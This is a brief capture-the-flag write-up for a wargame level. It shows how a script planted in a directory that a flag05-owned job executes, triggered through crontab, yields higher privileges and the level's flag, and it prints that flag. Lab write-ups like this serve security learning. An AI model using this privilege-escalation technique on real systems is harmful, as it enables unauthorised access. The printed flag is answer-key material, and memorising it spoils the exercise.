# level05

We got some intel from level00:
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
/opt/openarenaserver
/usr/sbin/openarenaserver
/rofs/opt/openarenaserver
/rofs/usr/sbin/openarenaserver

```cat /usr/sbin/openarenaserver``` shows a bash script that runs all scripts in ```/opt/openarenaserver```

```ls -la /usr/sbin/openarenaserver``` shows that this script belongs to flag05, thus executing it with crontab would maybe esacalte privileges

```echo -e "getflag > /opt/openarenaserver/flag" > /opt/openarenaserver/exploit.sh```

```crontab -e``` then ```* * * * * /opt/openarenaserver/exploit.sh``` to execute exploit every minute

wait for < 1 minute for crontab to execute

```cat /opt/openarenaserver/flag```

gives flag: ```viuaaale9huek52boumoomioc```
